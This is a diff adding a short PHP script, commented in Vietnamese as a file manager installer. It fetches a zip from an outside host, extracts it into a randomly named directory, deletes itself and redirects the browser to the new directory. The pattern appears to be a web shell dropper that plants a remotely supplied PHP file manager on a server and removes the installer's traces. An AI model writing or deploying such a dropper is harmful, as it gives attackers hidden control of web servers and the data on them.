@@ -1,0 +1,27 @@
+<?php
+
+// Doan ma cai dat file manager
+// Yeu cau: ext-zip
+
+$file_url = 'https://static.nightmare.top/app/file-manager-php/release.zip';
+$name = uniqid('manager-', true);
+$file_path = "$name/$name.zip";
+$file_dir = dirname($file_path);
+
+mkdir($file_dir);
+
+file_put_contents(
+    $file_path,
+    file_get_contents($file_url)
+);
+
+$zip = new ZipArchive();
+$zip->open($file_path);
+$zip->extractTo($file_dir);
+$zip->close();
+
+echo $file_dir . PHP_EOL;
+
+@unlink(__FILE__);
+@header("Location: $file_dir");
+@exit();
